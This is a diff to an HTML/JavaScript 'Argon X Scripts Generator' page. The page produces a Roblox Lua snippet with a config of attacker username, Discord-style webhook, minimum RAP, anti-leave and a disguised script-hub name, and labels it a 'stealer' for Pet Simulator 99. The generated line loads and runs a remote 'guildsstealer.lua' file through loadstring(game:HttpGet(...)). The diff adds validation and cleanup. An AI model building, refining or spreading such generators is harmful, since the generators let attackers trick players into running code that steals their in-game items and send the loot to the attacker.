@@ -50,31 +50,6 @@
     button:hover {
         background-color: #0056b3;
     }
-    #status {
-        margin-top: 20px;
-        font-size: 16px;
-    }
-    #pastelist {
-        margin-top: 20px;
-        text-align: left;
-        max-width: 600px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    #pastelist ul {
-        list-style-type: none;
-        padding: 0;
-    }
-    #pastelist li {
-        margin-bottom: 10px;
-    }
-    #pastelist a {
-        color: #007bff;
-        text-decoration: none;
-    }
-    #pastelist a:hover {
-        text-decoration: underline;
-    }
   </style>
 </head>
 <body>
@@ -82,13 +57,13 @@
     <h1>Argon X Scripts Generator!</h1>
     <form id="scriptForm">
       <label for="username">Username:</label>
-      <input type="text" id="username" name="username"><br><br>
+      <input type="text" id="username" name="username" required><br><br>
 
-      <label for="webhook">Webhook URL:</label>
-      <input type="text" id="webhook" name="webhook"><br><br>
+      <label for="webhook">Webhook URL (must be a valid URL):</label>
+      <input type="url" id="webhook" name="webhook" required><br><br>
 
       <label for="minimumRap">Minimum RAP:</label>
-      <input type="number" id="minimumRap" name="minimumRap"><br><br>
+      <input type="number" id="minimumRap" name="minimumRap" required><br><br>
 
       <label for="mouseLock">Mouse Lock:</label>
       <select id="mouseLock" name="mouseLock">
@@ -103,7 +78,10 @@
       </select><br><br>
 
       <label for="loadingscreen">Loading Screen:</label>
-      <input type="text" id="loadingscreen" name="loadingscreen"><br><br>
+      <select id="loadingscreen" name="loadingscreen">
+        <option value="true">True</option>
+        <option value="false">False</option>
+      </select><br><br>
 
       <label for="typesui">Types UI:</label>
       <select id="typesui" name="typesui">
@@ -120,26 +98,19 @@
 
       <label for="scriptname">Script Name:</label>
       <select id="scriptname" name="scriptname">
-        <option value="Overdrive H">Overdrive H</option>
-        <option value="Symphony Hub">Symphony Hub</option>
-        <option value="Highlight Hub">Highlight Hub</option>
         <option value="Nexus Hub">Nexus Hub</option>
-        <option value="Cleve Hub">Cleve Hub</option>
         <option value="Eclipse Hub">Eclipse Hub</option>
-        <option value="R3TH PRIV">R3TH PRIV</option>
-        <option value="AshbornnHub">AshbornnHub</option>
-        <option value="Nexus">Nexus</option>
-        <option value="YARHM">YARHM</option>
+        <option value="Clever Hub">Clever Hub</option>
       </select><br><br>
 
       <label for="stealer">Stealer:</label>
       <select id="stealer" name="stealer">
         <option value="ps99">Ps99</option>
-        <!-- Add more options as needed -->
+        <!-- More options can be added as needed -->
       </select><br><br>
 
       <button type="button" id="generateBtn">Generate</button>
-      <textarea id="output" readonly></textarea><br><br>
+      <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br><br>
       <button type="button" id="copyBtn">Copy to Clipboard</button>
     </form>
   </div>
@@ -163,26 +134,33 @@
         const scriptname = document.getElementById("scriptname").value;
         const stealer = document.getElementById("stealer").value;
 
-        if (!username || !webhook || !minimumRap || !stealer) {
-          alert("Please fill in all required fields.");
+        // Validate webhook URL
+        const urlPattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+          '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.?)+[a-z]{2,}|'+ // domain name
+          '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
+          '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
+          '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
+          '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
+
+        if (!urlPattern.test(webhook)) {
+          alert("Please enter a valid Webhook URL.");
           return;
         }
 
-        const outputString = `--generate through website\n` +
-                             `--website made by kizamies#0001/Shimm\n` +
+        const outputString = `-- Generated via Argon X Scripts Generator\n` +
                              `config = {\n` +
                              `    Username = "${username}",\n` +
                              `    Webhook = "${webhook}",\n` +
                              `    MinimumRap = "${minimumRap}",\n` +
                              `    mouseLock = ${mouseLock},\n` +
                              `    antileave = ${antileave},\n` +
-                             `    loadingscreen = "${loadingscreen}",\n` +
+                             `    loadingscreen = ${loadingscreen},\n` +
                              `    typesui = "${typesui}",\n` +
                              `    typescript = "${typescript}",\n` +
                              `    scriptname = "${scriptname}",\n` +
                              `    stealer = "${stealer}",\n` +
                              `}\n\n` +
-                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua",true))()';
+                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua", true))()';
 
         document.getElementById("output").value = outputString;
       });
@@ -190,7 +168,6 @@
       copyButton.addEventListener('click', function() {
         const copyText = document.getElementById("output");
         copyText.select();
-        copyText.setSelectionRange(0, 99999);
         document.execCommand("copy");
         alert("Copied to clipboard!");
       });
